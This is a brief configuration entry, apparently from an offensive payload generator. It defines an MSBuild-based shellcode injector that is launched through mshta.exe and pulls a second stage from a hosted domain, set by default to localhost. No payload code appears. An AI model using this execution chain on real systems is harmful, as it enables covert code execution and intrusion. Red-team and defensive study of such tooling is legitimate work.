[Type]
name: msbuild_nps_hta
info: MSBuild.exe based shellcode injector
template: ./template/MSBUILD/msbuild_nps_hta.template
runInfo: mshta.exe ${Output:var}

[HostedDomain]
var: http://127.0.0.1
allowWilds: True
help: The domain, IP, or path of your Hosted SCT second stage

[ListenerDomain]
